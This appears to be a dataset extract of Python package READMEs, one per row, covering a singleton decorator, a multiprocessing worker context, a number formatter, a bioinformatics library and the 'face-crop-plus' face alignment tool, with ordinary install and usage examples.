The main purpose of this repo was for me to learn more about Python, and some of its more advanced features. But this decorator comes with its advantages. It is not more powerful than for example [this](https://github.com/Kemaweyan/singleton_decorator) commonly used decorator by [Kemaweyan](https://github.com/Kemaweyan). However, it allows using singleton classes as actual classes, and therefore it might be more intuitive to use in situations where Kemayan's singleton object needs to use some extra attribute. Here is a quick illustration of situations in which our decorator behaves differently.

## Quick comparison with Kemayan's decorator
### Kemayan's decorator
```python
@singleton
class MyClass:
    @static
    def add(x, y):
        return x+y

# This will raise an AttributeError
MyClass.add(1, 2)

# You need to do this instead. It'll return 3
MyClass.__wrapped__.add(1, 2)
```

```python
@singleton
class MyClass:
    ...

obj = MyClass()

# this will raise an error
isinstance(obj, MyClass)

# you need to do this instead
isinstance(obj, MyClass.__wrapped__)
```

### This decorator

```python
@singleton
class MyClass:
    @static
    def add(x, y):
        return x+y

# This works fine
MyClass.add(1, 2)
```

```python
@singleton
class MyClass:
    ...

obj = MyClass()

# this works fine
isinstance(obj, MyClass)
```

# Usage


You can import the singleton class decorator as follows:

```python
from singleton_class_decorator import singleton
```

## Simplest use case
Here are some usage examples. To make a singleton class you simply need to use the singleton decorator
on your class as follows:

```python
@singleton
class MyClass:
    ...

# MyClass is now a singleton, which we can check
assert MyClass() is MyClass()

```

As mentioned earlier, you can check the type of an object as with a regular class:

```python
obj = MyClass()

type(obj)
# returns ``

type(obj) == MyClass
# This evaluates to True

isinstance(obj, MyClass)
# This evaluates to True

```

## Enabling Inheritance

The above should work for any class. However, if you try to create a child class from `MyClass` an error will be raised. This is because by default the singleton disables inheritance. 
```python
from singleton_class_decorator import singleton

@singleton
class MyClass:
    ...

# is equivalent to the following

@singleton(is_final=True)
class MyClass:
    ...
```
As you see, the default value of the keyword argument `is_final` is `True`, which disables inheritance. But you can easily change it.

```python
# enable inheritance by setting the ketword argument `is_final` for `False`
@singleton(is_final=False)
class MyClass:
    ...

# This will now work
class ChildClass(MyClass):
    ...

# However the ClidClass is not automatically a singleton
assert ChildClass() is not ChildClass()

# If you want a child class to be a singleton, you need to use the singleton decorator
# Again you may set the `is_final` to `True` or `False` as you whish.
@singleton
class OtherChildClass(MyClass):
    ...

# OtherChildClass is a singleton
assert OtherChildClass() is OtherChildClass()

```

# How Does it work?

Go check my blog post about this decorator [here](https://jrmy-rbr.github.io/2023/02/19/singleton_decorator.html) 
",jrmy-rbr/singleton-class-decorator
workercontext,https://github.com/OwenPendrighElliott/MultiWorker,0,4181,4181,"# Multi-Worker Context

This is a small project that create a context in python which can spin up multiple workers to do a task.

The only requirement is that a the function you want to give multiple workers to has only one argument that you would like to batch on. It is up to you to ensure that creating independant batches for multiple workers makes sense with this argument.

This makes refactoring code for multiprocessing a lot easier and should provide quick performance wins for time consuming functions with no interdependencies between elements.

## Setup

```
pip install workercontext
```

## Example

By default the work distribution will occur on the first parameter to the function.

Take the following function:

```python
from typing import List

def my_func(arr: List[int]) -> List[int]:
    return [el*2 for el in arr]
```

This can be simply split across multiple workers as follows:

```python
from workercontext import MultiWorker

arr = list(range(100))

with MultiWorker(my_func, n_processes=8) as f:
    res = f(arr)
print(res)
```

`res` will be a list of lists of `ints` in this case, if you would like to reduce across all workers then you can pass a reduction:

```python
from workercontext import MultiWorker
from workercontext.reductions import flatten_reduction

arr = list(range(100))

with MultiWorker(my_func, n_processes=8, reduction=flatten_reduction) as f:
    res = f(arr)
print(res)
```

`res` will now a list of `int`.

If you wanted to combine multiple reductions then you can use the reduction composition class

```python
from workercontext import MultiWorker
from workercontext.reductions import ReductionComposition, flatten_reduction, average_reduction

reductions = ReductionComposition([flatten_reduction, average_reduction])

with MultiWorker(my_func, n_processes=8, reduction=reductions) as f:
    res = f(arr)
print(res)
```

This makes res be a single `float`.

### Using other parameters

You can batch work on other parameters by specifying them in the constructor.

```python
from workercontext import MultiWorker
from workercontext.reductions import flatten_reduction

def my_func(l1: List[int], l2: List[int]) -> int:
    for i in range(len(l2)):
        for el1 in l1:
            l2[i] += el1
    return l2

arr1 = list(range(100))
arr2 = list(range(100))

with MultiWorker(my_func, batched_arg='l2', n_processes=8, reduction=flatten_reduction) as f:
    res = f(arr1, arr2)
print(res)
```

# Documentation

## MultiWorker
### parameters
+ `function` (`Callable`): The function to create the context for.
+ `n_processes` (`int`): The number of processes to spawn.
+ `batched_arg` (`str`, `optional`): The argument to batch on, if None the the first arg is used. Defaults to None.
+ `verbose` (`bool`, `optional`): Whether or not to print information about the processing. Defaults to False.
+ `reduction` (`Callable[[List[Any]], Any]`, `optional`): A reduction function to be applied across the outputs of the pool. Defaults to None.
## Supported Reductions
+ `flatten_reduction`
+ `histogram_reduction`
+ `product_reduction`
+ `string concatenation_reduction`
+ `bitwise and_reduction`
+ `bitwise or_reduction`
+ `min_reduction`
+ `max_reduction`

## Testing
```
pytest
```

## Formatting
```
black .
```

## How it works

TL;DR it does a bunch of introspection.

1. The args to your function are introspected.
2. The `self` arg is remove if you passed it a method from a class.
3. If no batched arg was specified then the first one is selected.
4. All args are converted into kwargs using the introspected arg names and the `*args` provided.
5. The size of the batched arg is calculated and the chunk sizes are derived.
6. The arg is batched and batches of kwargs are created.
7. A pool is created with a partial for a wrapper function that allows for the batching to occur on the kwargs. The last parameter to the wrapper is a callback to your function.
8. A reduction is applied (if specified)
9. Results are returned.
10. When you leave the context the pools are joined and closed.
","# Multi-Worker Context

This is a small project that create a context in python which can spin up multiple workers to do a task.

The only requirement is that a the function you want to give multiple workers to has only one argument that you would like to batch on. It is up to you to ensure that creating independant batches for multiple workers makes sense with this argument.

This makes refactoring code for multiprocessing a lot easier and should provide quick performance wins for time consuming functions with no interdependencies between elements.

## Setup

```
pip install workercontext
```

## Example

By default the work distribution will occur on the first parameter to the function.

Take the following function:

```python
from typing import List

def my_func(arr: List[int]) -> List[int]:
    return [el*2 for el in arr]
```

This can be simply split across multiple workers as follows:

```python
from workercontext import MultiWorker

arr = list(range(100))

with MultiWorker(my_func, n_processes=8) as f:
    res = f(arr)
print(res)
```

`res` will be a list of lists of `ints` in this case, if you would like to reduce across all workers then you can pass a reduction:

```python
from workercontext import MultiWorker
from workercontext.reductions import flatten_reduction

arr = list(range(100))

with MultiWorker(my_func, n_processes=8, reduction=flatten_reduction) as f:
    res = f(arr)
print(res)
```

`res` will now a list of `int`.

If you wanted to combine multiple reductions then you can use the reduction composition class

```python
from workercontext import MultiWorker
from workercontext.reductions import ReductionComposition, flatten_reduction, average_reduction

reductions = ReductionComposition([flatten_reduction, average_reduction])

with MultiWorker(my_func, n_processes=8, reduction=reductions) as f:
    res = f(arr)
print(res)
```

This makes res be a single `float`.

### Using other parameters

You can batch work on other parameters by specifying them in the constructor.

```python
from workercontext import MultiWorker
from workercontext.reductions import flatten_reduction

def my_func(l1: List[int], l2: List[int]) -> int:
    for i in range(len(l2)):
        for el1 in l1:
            l2[i] += el1
    return l2

arr1 = list(range(100))
arr2 = list(range(100))

with MultiWorker(my_func, batched_arg='l2', n_processes=8, reduction=flatten_reduction) as f:
    res = f(arr1, arr2)
print(res)
```

# Documentation

## MultiWorker
### parameters
+ `function` (`Callable`): The function to create the context for.
+ `n_processes` (`int`): The number of processes to spawn.
+ `batched_arg` (`str`, `optional`): The argument to batch on, if None the the first arg is used. Defaults to None.
+ `verbose` (`bool`, `optional`): Whether or not to print information about the processing. Defaults to False.
+ `reduction` (`Callable[[List[Any]], Any]`, `optional`): A reduction function to be applied across the outputs of the pool. Defaults to None.
## Supported Reductions
+ `flatten_reduction`
+ `histogram_reduction`
+ `product_reduction`
+ `string concatenation_reduction`
+ `bitwise and_reduction`
+ `bitwise or_reduction`
+ `min_reduction`
+ `max_reduction`

## Testing
```
pytest
```

## Formatting
```
black .
```

## How it works

TL;DR it does a bunch of introspection.

1. The args to your function are introspected.
2. The `self` arg is remove if you passed it a method from a class.
3. If no batched arg was specified then the first one is selected.
4. All args are converted into kwargs using the introspected arg names and the `*args` provided.
5. The size of the batched arg is calculated and the chunk sizes are derived.
6. The arg is batched and batches of kwargs are created.
7. A pool is created with a partial for a wrapper function that allows for the batching to occur on the kwargs. The last parameter to the wrapper is a callback to your function.
8. A reduction is applied (if specified)
9. Results are returned.
10. When you leave the context the pools are joined and closed.
",owenpendrighelliott/multiworker
readable-number,https://github.com/jsh9/readable-number,0,1906,1906,"# readable-number
A Python library to print numbers in human readable format

## 1. Installation

```
pip install readable-number
```

This library does not depend on any third-party libraries, so installing it will not break your Python environment.

## 2. Usage

```python
from readable_number import ReadableNumber

# Print digit in groups
str(ReadableNumber(-123))  # -123
str(ReadableNumber(-1234))  # -1,234
str(ReadableNumber(-123456789))  # -123,456,789
str(ReadableNumber(-12345.6789))  # -12,345.6789
str(ReadableNumber(-1.23456e18))  # -1,234,560,000,000,000,000

# Custom grouping (in other locales)
str(ReadableNumber(-123456789, digit_group_size=4))  # -1,2345,6789
str(ReadableNumber(-123456789, digit_group_delimiter='|'))  # -123|456|789

# Convert to human-readable shortform (with k, M, B, and T as unit)
str(ReadableNumber(12345, use_shortform=True))  # 12k
str(ReadableNumber(12345, use_shortform=True, precision=1))  # 12.3k
str(ReadableNumber(12345678, use_shortform=True))  # 12M
str(ReadableNumber(12345678, use_shortform=True, precision=2))  # 12.35M

# Numbers with small absolute values
str(ReadableNumber(0.12345))  # 0.12345
str(ReadableNumber(0.0000012345))  # 0.0000012345
str(ReadableNumber(0.12345, precision=None))  # 0.12345
str(ReadableNumber(0.12345, precision=2))  # 0.12
str(ReadableNumber(0.12345, precision=20))  # 0.123450000000000

# Digits beyond double-precision limit are discarded
str(ReadableNumber(0.12345678901234567890, precision=90))  # 0.123456789012346
str(ReadableNumber(1.23e-20, precision=90))  # 0.000000000000000

# Print large/small numbers in exponantial notation
str(ReadableNumber(1234567890, use_exponent_for_large_numbers=True))  # 1.234568e+09
str(ReadableNumber(0.000000012, use_exponent_for_small_numbers=True))  # 1.200000e-08
```

## 3. Full API documentation

Please visit this site: https://readable-number.readthedocs.io/en/stable/
","# readable-number
A Python library to print numbers in human readable format

## 1. Installation

```
pip install readable-number
```

This library does not depend on any third-party libraries, so installing it will not break your Python environment.

## 2. Usage

```python
from readable_number import ReadableNumber

# Print digit in groups
str(ReadableNumber(-123))  # -123
str(ReadableNumber(-1234))  # -1,234
str(ReadableNumber(-123456789))  # -123,456,789
str(ReadableNumber(-12345.6789))  # -12,345.6789
str(ReadableNumber(-1.23456e18))  # -1,234,560,000,000,000,000

# Custom grouping (in other locales)
str(ReadableNumber(-123456789, digit_group_size=4))  # -1,2345,6789
str(ReadableNumber(-123456789, digit_group_delimiter='|'))  # -123|456|789

# Convert to human-readable shortform (with k, M, B, and T as unit)
str(ReadableNumber(12345, use_shortform=True))  # 12k
str(ReadableNumber(12345, use_shortform=True, precision=1))  # 12.3k
str(ReadableNumber(12345678, use_shortform=True))  # 12M
str(ReadableNumber(12345678, use_shortform=True, precision=2))  # 12.35M

# Numbers with small absolute values
str(ReadableNumber(0.12345))  # 0.12345
str(ReadableNumber(0.0000012345))  # 0.0000012345
str(ReadableNumber(0.12345, precision=None))  # 0.12345
str(ReadableNumber(0.12345, precision=2))  # 0.12
str(ReadableNumber(0.12345, precision=20))  # 0.123450000000000

# Digits beyond double-precision limit are discarded
str(ReadableNumber(0.12345678901234567890, precision=90))  # 0.123456789012346
str(ReadableNumber(1.23e-20, precision=90))  # 0.000000000000000

# Print large/small numbers in exponantial notation
str(ReadableNumber(1234567890, use_exponent_for_large_numbers=True))  # 1.234568e+09
str(ReadableNumber(0.000000012, use_exponent_for_small_numbers=True))  # 1.200000e-08
```

## 3. Full API documentation

Please visit this site: https://readable-number.readthedocs.io/en/stable/
",jsh9/readable-number
antibodyomics,https://github.com/drewschaub/antibodyomics,0,571,489,"## About

---

**Source Code**: <a href=""https://https://github.com/drewschaub/antibodyomics"" target=""_blank"">https://https://github.com/drewschaub/antibodyomics</a>

---

Antibodyomics is a python library for performing structural and genetic  bioinformatic analysis in python. 

## Installation

---

Installation is handled using the python package installer `pip`

```console
$ pip install antibodyomics
```

## License

[![License](https://img.shields.io/github/license/drewschaub/antibodyomics)](https://opensource.org/licenses/MIT)

- Copyright © Andrew J. Schaub
","## About

---

**Source Code**: https://https://github.com/drewschaub/antibodyomics

---

Antibodyomics is a python library for performing structural and genetic  bioinformatic analysis in python. 

## Installation

---

Installation is handled using the python package installer `pip`

```console
$ pip install antibodyomics
```

## License

[![License](https://img.shields.io/github/license/drewschaub/antibodyomics)](https://opensource.org/licenses/MIT)

- Copyright © Andrew J. Schaub
",drewschaub/antibodyomics
pyopenbook,https://github.com/blockworks-foundation/pyopenbook,3,0,0,,,blockworks-foundation/pyopenbook
face-crop-plus,https://github.com/mantasu/face-crop-plus,4,22632,22522,"# Face Crop Plus

[![DOI](https://zenodo.org/badge/621262834.svg)](https://zenodo.org/badge/latestdoi/621262834)
[![PyPI](https://img.shields.io/pypi/v/face-crop-plus?color=orange)](https://pypi.org/project/face-crop-plus/)
[![Python: 3.10](https://img.shields.io/badge/python-3.10-brightgreen)](https://www.python.org/downloads/release/python-3100/)
[![CUDA: yes](https://img.shields.io/badge/cuda-yes-green)](https://developer.nvidia.com/cuda-toolkit)
[![License: MIT](https://img.shields.io/badge/license-MIT-lightgrey.svg)](https://opensource.org/licenses/MIT)

<p align=""center"" width=""100%"">

![Banner](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/banner.png)

</p>

## About

Image preprocessing package for automatic face alignment and cropping with additional features. It provides the following functionality:
1. **Face cropping** - face alignment and center-cropping using facial landmarks. Landmarks can be automatically predicted or, if they are already know, can be supplied through a separate file. It is possible to specify face factor, i.e., face area relative to the cropped image, and face extraction strategy, e.g., all faces or largest face per image.
2. **Face enhancement** - face image quality enhancement. If images are blurry or contain many small faces, quality enhancement model can be used to make the images clearer. Small faces in the image are automatically checked and enhanced if desired.
3. **Face parsing** - face attribute parsing and cropped image grouping to sub-directories. Face images can be grouped according to some facial attributes or some combination, such as _glasses_, _earrings and neckless_, _hats_. It is also possible to generate masks for facial attributes or some combination of them, for instance, _glasses_, _nose_, _nose and eyes_.

Please see _References_ section for more details about which models are used for each feature.

> **Note**: each feature can be used separately, e.g., if you just need to enhance the quality of blurry photos, or if you just need to generate attribute masks (like hats, glasses, face parts).

## Installation

The packages requires at least _Python 3.10_. You may also want to set up _PyTorch_ in advance from [here](https://pytorch.org/get-started/locally/). 

To install the package simply run:

```bash
pip install face-crop-plus
```

Or, to install it from source, run:
```bash
git clone https://github.com/mantasu/face-crop-plus
cd face-crop-plus && pip install .
```

## Quick Start

You can run the package from the command line:
```
face-crop-plus -i path/to/images
```

You can also use it in a Python script:
```python
from face_crop_plus import Cropper

cropper = Cropper(face_factor=0.7, strategy=""largest"")
cropper.process_dir(input_dir=""path/to/images"")
```

For a quick demo, you can experiment with [demo.py](https://github.com/mantasu/face-crop-plus/blob/main/demo/demo.py) file:
```bash
git clone https://github.com/mantasu/face-crop-plus
cd face-crop-plus/demo
python demo.py
```

For more examples, see _Examples_ section.

## Features

Here, some of the main arguments are described that control the behavior of each of the features. These arguments can be specified via command line or when initializing the `Cropper` class. For further details about how the `Cropper` class works, please refer to the documentation.

### Alignment and Cropping

The main feature is face alignment and cropping. The main arguments that control this feature:

* `landmarks` - if you don't want automatic landmark prediction and already have face landmark coordinates in a separate file, you can specify the path to it. See the table below for the expected file formats.

    | File format      | Description                                                                                                                                                                          |
    | :--------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
    | `.json`          | Expects a dictionary with the following example entries: `'image.jpg': [x1, y1, ...]`. I.e., keys are image file names and values are flattened arrays of face landmark coordinates. |
    | `.csv`           | Expects comma-separated values of where each line is of the form `image.jpg,x1,y1,...`. Note that it also expects the first line to be a header.                                     |
    | `.txt` and other | Similar to CSV file, but each line is expected to have space-separated values of the form `image.jpg x1 y1 ...`. No header is expected.                                              |

* `output_size` - the output size of the cropped face images. Can be either a tuple of 2 values (weight, height) or a single value indicating square dimensions

    | 200 × 200                           | 300 × 300                           | 300 × 200                           | 200 × 300                           |
    | :---------------------------------: | :---------------------------------: | :---------------------------------: | :---------------------------------: |
    | ![200x200](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/size_200x200.jpg) | ![300x300](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/size_300x300.jpg) | ![300x200](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/size_300x200.jpg) | ![200x300](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/size_200x300.jpg) |

* `face_factor` - the fraction of the face area relative to the output image. The value is between 0 and 1 and, the larger the value, the larger the face is in the output image.

    | 0.4                           | 0.55                            | 0.7                            | 0.85                            |
    | :---------------------------: | :-----------------------------: | :----------------------------: | :-----------------------------: |
    | ![0.4](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/factor_0.4.jpg) | ![0.55](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/factor_0.55.jpg) | ![0.55](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/factor_0.7.jpg) | ![0.55](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/factor_0.85.jpg) |

* `padding` - the type of padding (border mode) to apply after cropping the images. If faces are near edges, the empty areas after aligning those faces will be filled with some values. This could be _constant_ (leave black), _replicate_ (repeat the last value of the edge in the original image), _reflect_ (mirror the values before the edge).

    | Constant                                                                                               | Replicate                                                                                                | Reflect                                                                                              | Wrap                                                                                           |
    | :----------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------------: |
    | ![constant](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/padding_constant.jpg) | ![replicate](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/padding_replicate.jpg) | ![reflect](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/padding_reflect.jpg) | ![wrap](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/padding_wrap.jpg) |

* `det_threshold` - if automatic detection is desired, then detection threshold, which is a value between 0 and 1, can be specified to indicate when the detected face should be considered an actual face. Lower values allow more faces to be extracted, however they can be blurry and not non-primary, e.g., the ones in the background. Higher values only alow clear faces to be considered. It only makes sense to play around with this parameter when `strategy` is specified to return more than one face, e.g., _all_. For example, if it is `0.999`, the blurry face in the background in the examples above is not detected, however if the threshold `0.998`, the face is still detected. For blurrier images, thresholds may differ.

* `strategy` - the strategy to apply for cropping out images. This can be set to _all_, if all faces should be extracted from each image (suffixes will be added to each file name), _largest_, if only the largest faces should be considered (slowest), _best_ if only the first face (which has the best confidence score) per image should be considered.

### Quality Enhancement

Quality enhancement feature allows to restore blurry faces. It has one main argument:

* `enh_threshold` - quality enhancement threshold that tells when the image quality should be enhanced. It is the minimum average face factor, i.e., face area relative to the image, below which the whole image is enhanced. Note that quality enhancement is an expensive operation, thus set this to a low value, like `0.01` to only enhance images where faces are actually small. If your images are of reasonable quality and don't contain many tiny faces, you may want to set this to _None_ (or to a negative value if using command-line) to disable the model. Here are some of the examples of the extracted faces before and after enhancing the image:

    | Face 1                 | Face 2                 | Face 3                 | Face 4                 |
    | :--------------------: | :--------------------: | :--------------------: | :--------------------: |
    | ![b1](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f1_b.jpg) | ![b2](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f2_b.jpg) | ![b3](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f3_b.jpg) | ![b6](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f4_b.jpg) |
    | ![a1](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f1_a.jpg) | ![a2](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f2_a.jpg) | ![a3](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f3_a.jpg) | ![a6](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f4_a.jpg) |


> Quality enhancement can be used as a separate feature to enhance images that contain faces. For an end user, it is a useful feature to boost the quality of photos. It is not suggested to enhance ultra high resolution images (>2000) because your GPU will explode. See _Pure Enhancement/Parsing_ section on how to run it as a stand-alone.


### Attribute Parsing

Face parsing to attributes allows to group output images by category and generate attribute masks for that category. Categorized images are put to their corresponding sub-folders in the output directory.
* `attr_groups` - dictionary specifying attribute groups, based on which the face images should be grouped. Each key represents an attribute group name, e.g., _glasses_, _earings and neckless_, _no accessories_, and each value represents attribute indices, e.g., `[6]`, `[9, 15]`, `[-6, -9, -15, -18]`, each index mapping to some attribute. Since this model labels face image pixels, if there is enough pixels with the specified values in the list, the whole face image will be put into that attribute category. For negative values, it will be checked that the labeled face image does not contain those (absolute) values. If it is None, then there will be no grouping according to attributes. Here are some group examples with 2 sample images per group:

    | Glasses <br/> `[6]`           | Earrings and neckless <br/> `[9, 15]`       | Hats, no glasses <br/> `[18, -6]`     | No accessories <br/> `[-6, -9, -15, -18]` |
    | :---------------------------: | :-----------------------------------------: | :-----------------------------------: | :---------------------------------------: |
    | ![ag11](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/glasses_1.jpg) | ![ag21](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/earrings_and_neckless_1.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/hats_no_glasses_1.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/no_accessories_1.jpg)      |
    | ![ag12](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/glasses_2.jpg) | ![ag21](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/earrings_and_neckless_2.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/hats_no_glasses_2.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/no_accessories_2.jpg)      |

* `mask_groups` - Dictionary specifying mask groups, based on which the face images and their masks should be grouped. Each key represents a mask group name, e.g., _nose_, _eyes and eyebrows_, and each value represents attribute indices, e.g., `[10]`, `[2, 3, 4, 5]`, each index mapping to some attribute. Since this model labels face image pixels, a mask will be created with 255 (white) at pixels that match the specified attributes and zeros (black) elsewhere. Note that negative values would make no sense here and having them would cause an error. Images are saved to sub-directories named by the mask group and masks are saved to sub-directories under the same name, except with `_mask` suffix. If it is None, then there will be no grouping according to mask groups. Here are some group examples with 1 sample image and its mask per group (for consistency, same images as before):

    | Glasses <br/> `[6]`           | Earrings and neckless <br/> `[9, 15]`       | Nose <br/> `[10]`                     | Eyes and eyebrows <br/> `[2, 3, 4, 5]` |
    | :---------------------------: | :-----------------------------------------: | :-----------------------------------: | :------------------------------------: |
    | ![ag11](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/glasses_1.jpg) | ![ag21](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/earrings_and_neckless_1.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/hats_no_glasses_1.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/no_accessories_1.jpg)   |
    | ![ag11](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/glasses_m.jpg ) | ![ag21](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/earrings_and_neckless_m.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/hats_no_glasses_m.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/no_accessories_m.jpg)   |

> If both `attr_groups` and `mask_groups` are specified, first images are grouped according to face attributes, then images in each groups are further sub-grouped to different mask groups (along with their masks).


Here are the 19 possible face attributes (with `0` representing the neutral category):

<p align=""center"" width=""100%"">

|                     |                  |                  |
| ------------------- | ---------------- | ---------------- |
| `1` - skin          | `7` - left ear   | `13` - lower lip |
| `2` - left eyebrow  | `8` - right ear  | `14` - neck      |
| `3` - right eyebrow | `9` - earrings   | `15` - neckless  |
| `4` - left eye      | `10` - nose      | `16` - clothes   |
| `5` - right eye     | `11` - mouth     | `17` - hair      |
| `6` - eyeglasses    | `12` - upper lip | `18` - hat       |

</p>

## Examples

### Running via Command Line

You can run the package via command line by providing the arguments as follows:
```bash
face-crop-plus -i path/to/images --output-size 200 300 --face-factor 0.75 -d cuda:0
```

You can specify the command-line arguments via JSON config file and provide the path to it. Further command-line arguments would overwrite the values taken from the JSON file.
```bash
face-crop-plus --config path/to/json --attr-groups '{""glasses"": [6]}'
```

An example JSON config file is [demo.json](https://github.com/mantasu/face-crop-plus/blob/main/demo/demo.json). If you've cloned the repository, you can run from it:
```bash
face-crop-plus --config demo/demo.json --device cuda:0 # overwrite device
```

For all the available command line arguments, just type (although refer to documentation for more details):
```bash
face-crop-plus -h
```

> **Note**: you can use `fcp` as `face-crop-plus` alias , e.g., `fcp -c config.json`

### Pure Enhancement/Parsing

If you already have aligned and center-cropped face images, you can perform quality enhancement and face parsing without re-cropping them. Here is an example of enhancing quality of every face and parsing them to (note that none of the parameters described in _Alignment and Cropping_ section have any affect here):

```python
from face_crop_plus import Cropper

cropper = Cropper(
    det_threshold=None,
    enh_threshold=1, # enhance every image   
    attr_groups={""hats"": [18], ""no_hats"": [-18]},
    mask_groups={""hats"": [18], ""ears"": [7, 8, 9]},
    device=""cuda:0"",
)

cropper.crop(input_dir=""path/to/images"")
```

This would result in the following output directory structure:
```bash
└── path/to/images_faces
     ├── hats
     |    ├── hats       # Images with hats
     |    ├── hats_mask  # Hat masks for images in upper dir
     |    ├── ears       # Images with hats and visible ears
     |    └── ears_mask  # Ears masks for images in upper dir
     |
     └── no_hats
          ├── ears       # Masks with no hats and visible ears
          └── ears_mask  # Ears masks for images in upper dir
```

To just enhance the quality of images (e.g., if you have blurry photos), you can run enhancement feature separately:
```bash
face-crop-plus -i path/to/images -dt -1 -et 1 --device cuda:0
```

To just generate masks for images (e.g., as part of your research pipeline), you can run segmentation feature separately. This will only consider images for which the masks are actually present.
```bash
face-crop-plus -i path/to/images -dt -1 -et -1 -mg '{""glasses"": [6]}'
```

Please beware of the following:
* While you can perform quality enhancement on images of different sizes (because, due to large amount of computations, images are processed one by one), you cannot perform face parsing (attribute-based grouping/segmentation) if images have different dimensions (though a possible work around is to set the batch size to 1).
* It is not advised to perform quality enhancement after cropping the images since there is not enough information for the model on how to improve the quality. If you still need to enhance the quality after cropping, using larger image sizes, e.g., `512×512`, may help. Regardless whether you use it before or after cropping, do not use input images of spatial size over `2000×2000`, unless you have a powerful GPU.

### Preprocessing CelebA

Here is an example pipeline of how to pre-process [CelebA](https://mmlab.ie.cuhk.edu.hk/projects/CelebA.html) dataset. It is useful if you want to customize the cropped face properties, e.g., face factor, output size. It only takes a few minutes to pre-process the whole dataset using multiple processors and the provided landmarks:
1. Download the following files from _Google Drive_:
    * Download `img_celeba.7z` folder from [here](https://drive.google.com/drive/folders/0B7EVK8r0v71peklHb0pGdDl6R28?resourcekey=0-f5cwz-nTIQC3KsBn3wFn7A) and put it under `data/img_celeba.7z`
    * Download `annotations.zip` file from [here](https://drive.google.com/file/d/1xd-d1WRnbt3yJnwh5ORGZI3g-YS-fKM9/view) and put it under `data/annotations.zip`
2. Unzip the data:
    ```bash
    7z x data/img_celeba.7z/img_celeba.7z.001 -o./data
    unzip data/annotations.zip -d data
    ```
3. Create a script file, e.g., `preprocess_celeba.py`, in the same directory:
    ```python
    from face_crop_plus import Cropper
    from multiprocessing import cpu_count

    cropper = Cropper(
        output_size=256,
        face_factor=0.7,
        landmarks=""data/landmark.txt"",
        enh_threshold=None,
        num_processes=cpu_count(),
    )

    cropper.process_dir(""data/img_celeba"")
    ```
4. Run the script to pre-process the data:
    ```bash
    python preprocess_celeba.py
    ```
5. Clean up the data dir (remove the original images and the annotations):
    ```
    rm -r data/img_celeba.7z data/img_celeba
    rm data/annotations.zip data/*.txt
    ```

## Tips

1. When using `num_processes`, only set it to a larger value if you have enough GPU memory, or reduce `batch_size`. Unless you only perform face cropping with already known landmarks and don't perform quality enhancement nor face parsing, in which case set it to the number of CPU cores you have.
2. If you experience any of the following:
    * RuntimeError: CUDA error: an illegal memory access was encountered.
    * torch.cuda.OutOfMemoryError: CUDA out of memory.
    * cuDNN error: CUDNN_STATUS_MAPPING_ERROR.

   This is likely because you are processing images on too many processes or have a large batch size. If you run all 3 models on GPU, it may be helpful to just run on a single process with a larger batch size.

## References

This package uses the code and the pre-trained models from the following repositories:
* [PyTorch RetinaFace](https://github.com/biubug6/Pytorch_Retinaface) - 5-point landmark prediction
* [BSRGAN](https://github.com/cszn/BSRGAN) - super resolution and quality enhancement
* [Face Parsing PyTorch](https://github.com/zllrunning/face-parsing.PyTorch) - grouping by face attributes and segmentation

## Citation

If you find this package helpful in your research, you can cite the following:
```bibtex
@misc{face-crop-plus,
  author = {Mantas Birškus},
  title = {Face Crop Plus},
  year = {2023},
  publisher = {GitHub},
  journal = {GitHub repository},
  howpublished = {\url{https://github.com/mantasu/face-crop-plus}},
  doi = {10.5281/zenodo.7856749}
}
```
","# Face Crop Plus

[![DOI](https://zenodo.org/badge/621262834.svg)](https://zenodo.org/badge/latestdoi/621262834)
[![PyPI](https://img.shields.io/pypi/v/face-crop-plus?color=orange)](https://pypi.org/project/face-crop-plus/)
[![Python: 3.10](https://img.shields.io/badge/python-3.10-brightgreen)](https://www.python.org/downloads/release/python-3100/)
[![CUDA: yes](https://img.shields.io/badge/cuda-yes-green)](https://developer.nvidia.com/cuda-toolkit)
[![License: MIT](https://img.shields.io/badge/license-MIT-lightgrey.svg)](https://opensource.org/licenses/MIT)



